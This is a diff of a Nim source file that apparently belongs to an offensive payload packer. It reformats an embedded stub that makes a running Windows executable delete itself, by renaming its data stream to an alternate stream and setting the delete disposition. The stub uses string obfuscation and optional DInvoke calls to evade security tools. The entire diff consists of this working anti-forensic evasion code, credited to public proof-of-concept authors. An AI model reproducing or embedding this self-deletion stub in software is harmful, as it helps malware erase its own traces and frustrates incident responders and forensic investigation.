@@ -1588,57 +1588,51 @@ MyPathFileExistsW = cast[PathFileExistsW_t](pathfileExistsAddress)
 
 let FileDeleteStub * = """
 
-#[
-    Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
-    License: BSD 3-Clause
-    Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
-    References:
-        - https://github.com/LloydLabs/delete-self-poc
-        - https://twitter.com/jonasLyk/status/1350401461985955840
-]# 
+    #[
+        Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
+        License: BSD 3-Clause
+        Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
+        References:
+            - https://github.com/LloydLabs/delete-self-poc
+            - https://twitter.com/jonasLyk/status/1350401461985955840
+    ]# 
 
-# Don't want to import the everything from winim, only what's really needed
-from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
-from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
 
-template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
-template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)
+    proc PathFileExistsW(pszPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "shlwapi", importc.}
 
-proc PathFileExistsW*(pszPath: LPCWSTR): WINBOOL {.winapi, stdcall, dynlib: "shlwapi", importc.}
+    var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))
 
-var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))
+    proc ds_open_handle(pwPath: PWCHAR): HANDLE =
+        when defined(DInvoke): 
+            return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+        else:
+            return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
 
-proc ds_open_handle(pwPath: PWCHAR): HANDLE =
-    when defined(DInvoke): 
-        return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
-    else:
-        return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+    proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
+        var fRename: FILE_RENAME_INFO
+        RtlSecureZeroMemory(addr fRename, sizeof(fRename))
 
-proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
-    var fRename: FILE_RENAME_INFO
-    RtlSecureZeroMemory(addr fRename, sizeof(fRename))
+        var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
+        fRename.FileNameLength = sizeof(lpwStream).DWORD
+        RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))
 
-    var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
-    fRename.FileNameLength = sizeof(lpwStream).DWORD
-    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))
+        when defined(DInvoke):
+            return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
+        else:
+            return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
 
-    when defined(DInvoke):
-        return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
-    else:
-        return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
+    proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
+        var fDelete: FILE_DISPOSITION_INFO
+        RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))
 
-proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
-    var fDelete: FILE_DISPOSITION_INFO
-    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))
+        fDelete.DeleteFile = TRUE
 
-    fDelete.DeleteFile = TRUE
+        when defined(DInvoke):
+            return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
+        else:
+            return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
 
-    when defined(DInvoke):
-        return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
-    else:
-        return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
 
-when isMainModule:
     var
         wcPath: array[MAX_PATH + 1, WCHAR]
         hCurrent: HANDLE
